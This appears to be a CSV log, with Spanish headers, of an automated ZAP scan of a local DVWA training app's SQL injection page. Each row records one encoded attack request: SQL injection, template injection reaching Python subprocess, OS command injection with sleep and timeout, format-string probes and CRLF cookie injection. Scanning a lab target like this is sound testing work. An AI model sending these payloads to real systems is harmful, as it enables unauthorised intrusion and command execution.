ID,Petición (Tiempo),Marca de tiempo Respuesta,Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo)
240,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,302,Found,1,628,0
241,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,302,Found,1,628,0
242,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,302,Found,1,628,0
243,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%25%3D%25x%28sleep+15%29%25%3E,302,Found,1,628,0
244,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%23%7B%25x%28sleep+15%29%7D,302,Found,1,628,0
245,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7Bsystem%28%22sleep+15%22%29%7D,302,Found,1,628,0
246,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
247,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%26sleep+15.0%26&Submit=Submit,302,Found,1,628,0
248,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bsleep+15.0%3B&Submit=Submit,302,Found,1,628,0
249,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%26sleep+15.0%26%22&Submit=Submit,302,Found,1,628,0
250,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%3Bsleep+15.0%3B%22&Submit=Submit,302,Found,1,628,0
251,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%26sleep+15.0%26%27&Submit=Submit,302,Found,1,628,0
252,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%3Bsleep+15.0%3B%27&Submit=Submit,302,Found,1,628,0
253,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%26timeout+%2FT+15.0&Submit=Submit,302,Found,0,628,0
254,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%7Ctimeout+%2FT+15.0&Submit=Submit,302,Found,2,628,0
255,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%26timeout+%2FT+15.0%26%22&Submit=Submit,302,Found,3,628,0
256,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%7Ctimeout+%2FT+15.0&Submit=Submit,302,Found,2,628,0
257,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%26timeout+%2FT+15.0%26%27&Submit=Submit,302,Found,1,628,0
258,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%7Ctimeout+%2FT+15.0&Submit=Submit,302,Found,3,628,0
259,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bstart-sleep+-s+15.0&Submit=Submit,302,Found,2,628,0
260,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%3Bstart-sleep+-s+15.0&Submit=Submit,302,Found,1,628,0
261,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%3Bstart-sleep+-s+15.0&Submit=Submit,302,Found,4,628,0
262,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bstart-sleep+-s+15.0+%23&Submit=Submit,302,Found,1,628,0
263,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%26sleep+15.0%26,302,Found,3,628,0
264,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bsleep+15.0%3B,302,Found,1,628,0
265,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%26sleep+15.0%26%22,302,Found,2,628,0
266,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%3Bsleep+15.0%3B%22,302,Found,1,628,0
267,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%26sleep+15.0%26%27,302,Found,1,628,0
268,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%3Bsleep+15.0%3B%27,302,Found,1,628,0
269,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%26timeout+%2FT+15.0,302,Found,2,628,0
270,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%7Ctimeout+%2FT+15.0,302,Found,2,628,0
271,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%26timeout+%2FT+15.0%26%22,302,Found,2,628,0
272,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%7Ctimeout+%2FT+15.0,302,Found,2,628,0
273,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%26timeout+%2FT+15.0%26%27,302,Found,1,628,0
274,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%7Ctimeout+%2FT+15.0,302,Found,5,628,0
275,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bstart-sleep+-s+15.0,302,Found,2,628,0
276,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%3Bstart-sleep+-s+15.0,302,Found,1,628,0
277,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%3Bstart-sleep+-s+15.0,302,Found,1,628,0
278,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bstart-sleep+-s+15.0+%23,302,Found,1,628,0
279,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
280,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/,200,OK,1,613,1342
281,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/,200,OK,3,613,1342
282,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,0,224,366
283,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=xbmmbRwxMBasCtLtGqMQvLlnuXQoScgWNyVOtmsIyYAjsfZoVOXPTeoIHwaaVxtNhnlFYGfxrxiIgfhmULwqRQXdRyCaZWGhgTwTRjcsAdnWyXeuOQxMLmfijUfhqHaBPfvWKdoBWucmrGUUYymbDUNmmjwTfjtAkheuafDnWQCLeGOMltsMXPIGMnGcORjkRsWTlsSqNLrCtsgvvWVTlWflpkcdsiUjOEmZamOEfNOnJndabUuyrCIvyDudXifMalOnUXuwYEisnUFYiVAXLLSHMmxMTfrJojRWUpjBNEedkfXUeqVRVfCtvsDlUfoDLevjJuCAPQUXflnNbUMZIdTRXdIcONvmRHfmIUxtoEoJGAmNCYtoqtIooOkQgHTPjlnKCjvTECmvfFqFAlCmbGdbQZRCVcjLMFiNcXCHHKMaMgRkUjFEVQOdlWiYbNKHpSviMHInSiMUcYxsFKgmnTmHJvMAuJnFEERGNdujljCwIRHWHrqdIYNvtpyGKXQBltROqbVkHnoBKFwbymkRrmCKDuFMhonhyyipIoLgvJUJZNXevBdXoNLDVglLbZfiWREDSwuTuVOqpgQhCmLrhNwEJgjnehgmMixqhtmXETdIiosJTiBtWEyeOIaSYGiwrYMuQPYpdmxZtEQslSaIVxGrAhfpZTZqojKkqoFDQWEEFBZfooMhYbMJvIJiLErdVrmhZXUosCvOkTeeSCumbLsPpExdbTDOCTBvNWJnOoNtftUZhIiebyySweChlkIdUrTsHOdsHrSSHLXsSTbpIdixnDTMFVNHiQuNxlYcYsxnYFNWHUFCLVFLKJfpRCbZiWJSjFFjLrrOmPHNsirZQoSKaZBWSgpUmoRZkFKAtMjZrSxVrIKmtLiPnkrhOwZVLriViybBgdgkTUfUWqtIlFsTRvgWdNwualoxeMTLeVFTTxYvvujkbtTvYSBvwtQAVdthDNsUTvLSyZCnNSmTyJtrjgBLXcvwWaHbgvSTOcFMLKyNCaHWvhxphoElexNhMZecXHObGWfIaIQKUGFXGsrSiluruHDhKOCmbPfoXOTBtFjcyrbZxTLlglZAwDEMlCZFntJUdHSTmkoPKyFBxQntTNUtFxbfUMvkChGbYZpvaJhBsdZqTxlYFHNxOwWCGFfUIyqtRKOucAcJlbnENsTLiACMFxWgfuBYfoIwhNJaHuGwisXqjGMDJCeYIBvofLVgWpdYAFZHAkaxBVxQMhFsVYVWUrUsLRqAYAKbPfQgUpFknsNapFTumDaLsBXyyIpZcydZVmRvyWVQBWZqjEaArmUHSlbIKGtWGYqbgTSLiISYfUWmqnXvGCERsvoHnvuksJvnBkaPjurAXHtuSFKEUpjIKoaqbafQwCPFLPhPIpaVRbppmacwVMunMbdsKCSStNGsgNwUMOhLwexxnYLLqtLBihDkMiJobLdoaZvZGXShReEynKqheBcnJSVYZnGdfpMncSIENuEyARkXFJSgeMLvIHymKeyZOPmJNemUJLYBWphjdncjTUVlMykJRUsrucWaPSexgRumyFmQWWuFEhUSMuvLHKlrALikcnBkrDlAWdqhCYZjrwZVvTIpenbwLgfRYscqotypKeUIHWSArUwtjLcunCynwOuONkPyWPPaOVJnvrJlaPOoDAjKhxSTcqfflkGrVcZAKigkdmVaTMxOiFpstLQQNlBxBjgWvExrpssAnpdKmvAXgCQSPrDuSKnWSmFdoDlHEaLloaQhPlRDkYaKKhJMdWYZnPsQjIcyZxFXAwMJGJeLIHIiCanpNtfOoCNyxBYlrKWWnBjVdvKQUYwNmEeRXURuOsOTmyjwVruFeCbxkovOdrekyVyXylOeRMJQSVWrYXBHBZRxNTunlgTxXaNXTQFFrpWFQKkhmKBKEFigQyBXxtWkoCRjqeiTnXwfHxsfQVniCqyhIisIpiFCCJhrDHoNfxnyvkttiFpYCvAlgmqTcUIlkZHACXwtpCLnIOteJOKaerrSANETImdZNqnKXPqhuKXbUfkXxgKnfchoIOvSyEGAoCnNAMObBEuqmuPhAPNqvkYusEkupaUNlnpllSIxKbarGHmIZNoq&Submit=Submit,200,OK,1,613,1342
284,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=dlnIGZjlunyFnSirRJaAriBkXUmMOqyBvUEVDTvPNGMChErJrMVTvuVevSxYOmEBfCUGhZsVZUgjlcaCQKItqIoZLCLWpndCOWbfTPxPUeJHBLVoqgHNqpknsEWtarLJiZWtoxMRtvcvYbJVpMWNpTNsAinfKUxUpRXJnbhfnRhswZINawvcnFHiCEGSyoMVLkuqQHIKibDjPLRoGrEIbouJqZsfgoWMscnwHfoeqGYETUttNQwPCnFaijRfqSphKQEXOwAhRQJwCVhGfXKPBLRyggmJbcvQYusyfNZHURtaxXXCoMXoVVsQvsqCNafgONwkIdyGRaWotAXsDqKuQKgvYNOgFRvVqtxkjONIPRgLIenPSXPyIRfnKdDvxHTJmatEvmCXwFViDniCYYYBWGqvECYLeZehyTNfRIORspkNSiIqcsswRcTiPXGFplUPajtgbUwYGwemdYAemfWZFujqEptFnimcxGnjpFLYpLqderAbAONTpMclCZZcwgVUKKinBVCwNDOHMlvxpDwhRedrFhKNqtZTxWbNmKCwWNRnkZdlQwRFXfUAARseuyhJGsbetHSndIWPclwKsdLiYCknKeCACbSpRPiNPlQTTofEcDUohhrCVrctSgtcgZfduUGmqqlcyQuinVHopAelMunGOCSuGHpKsjDyjyRqlJtTcenGcEaNLYjLCeBeoStcmxaYKlirIEERNvidRYLIUhjsKMLuCAKrWIWBiTCMAXoJGUlbuDwIeZNMwwJmfjquPKBoJwvUZogPtYmUjaAFBkWCUYxRMPUCKqHnLtKwklEHwGJPTxersSfcjpfALRanPVGdFbbxGGWROOglbGNgyYnNDYZXlsjGpnNEbvBwMJaIHpTefGUDHasTQwBAFXXnTHjWiaMNsQrtBjjQbHDtnYFnCqYdHHPLRLbMAlhXLtxfrwKtSaUxdijUqoNSmUwgrTgunBfIDfaGkDiGWHkQBvpLyOqDShIFTBZeFUmxayLFvXpWcYXZYkgEkuGSPOvNRFUwxIvwRSEfArFbUCpesqjhiJJyFFQEOuSIsTequwyhGYymHdufmrtbVTFyrTYbgDBRRyHHuKIQwNaaZYUJaBAUruSttwmqVRVkTuYNnijHvUPZaLbnaCvxRKqFLyOEOnddCWmhIaNQuZsjelOjNCscoPrUDEvuOpHdLBnTqWgOSffKHvoLyLZdrvBRHnbsOkZanJuiToxZIRdawKsnfGEIDIIJEoWCjOxRPRVYsJEthhnRVNgLxltVKWQjsuDoCFVjwvEkwOycvorDqCxNTvmeVJiEUBGtimbatrfIBgnCbQvfZHpFqhqZCsKfeiLAQprcUwLoTboFqaZVtWFPgdVZdSiSRaJwIkwlEeorjnLDMyHNcHOISMQMVdmHKciKNLSMbonItfaHpjJMWWBgKfUIfWsZuwshAhGIaGAJOxtZhOZMsHOtfKyTQwdjYKWhYBhxPxXJOvfxfMocUangijMxlVvFMIsYOwVeVMUfQYWHehXWMvJospsFFCJUVsDfJMTLaHgkjxAGXHBjJodTyxFGoFJYNJUquMbhHJHEslDVKjQDZTGAFgSiuPMIHiOQwhyfjeomNCKkLSZVyUjpBFsLXdCXGYXyCCjFJxvGRKZkjqorltnekkPbVHwPtYYUpDPYnNZXoiviCywclkkimCmpglskFCsTlaJkjtVdWOjgyZPGvTKDgTqoWWsNorpsPYQNhGmhkdXVytShpxMWqVavPUHaIaixFKHvkoGyGnsIGKpnnufApKQkqIvAHtPDEhvfgAsLYZOwwKOZtABapKwBHqIWQLiNsgtGKAglIrADmoFXsgDDUJpoanMdCAsNqucwlqmsXXDIibqUmpKqsFiechpulPEVvWyWsncooTeEMKstayyObOieVesCdPHGIvotKxwUbhgUXnIxudSDTBMccONWgcbCMVAcVLOpbBMGpqpywrTkAJIwStJMIVcEyVHWVImJkdgeUZLnirbwTfKpMpvlikggwfGoxINKlQqZHqGXpUgYrrIPRhJOfiTZQFRlqPVrQifrgYgtBYSFuyqaxTOqQhatHHtcaAmgoTqQQTIUvNYR,200,OK,1,613,1342
285,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
286,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=ZAP&Submit=Submit,200,OK,1,613,1342
287,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A&Submit=Submit,200,OK,2,613,1342
288,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A&Submit=Submit,200,OK,1,613,1342
289,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=ZAP,200,OK,1,613,1342
290,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A,200,OK,1,613,1342
291,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A,200,OK,1,613,1342
292,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
293,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=Set-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,2,628,0
294,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,1,628,0
295,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%3F%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,1,628,0
296,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,1,628,0
297,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%3F%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,1,628,0
298,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68%0D%0A&Submit=Submit,302,Found,1,628,0
299,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%3F%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68%0D%0A&Submit=Submit,302,Found,1,628,0
300,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Set-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,0,628,0
301,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,1,628,0
302,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%3F%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,1,628,0
303,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,1,628,0
304,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%3F%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,1,628,0
305,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68%0D%0A,302,Found,1,628,0
306,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%3F%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68%0D%0A,302,Found,1,628,0
307,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
308,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,200,OK,3,613,1342
309,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?=&Submit=Submit,200,OK,1,613,1342
310,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=&Submit=Submit,200,OK,2,613,1342
311,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%40&Submit=Submit,200,OK,1,613,1342
312,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%2B&Submit=Submit,200,OK,1,613,1342
313,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%00&Submit=Submit,200,OK,1,613,1342
314,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7C&Submit=Submit,200,OK,1,613,1342
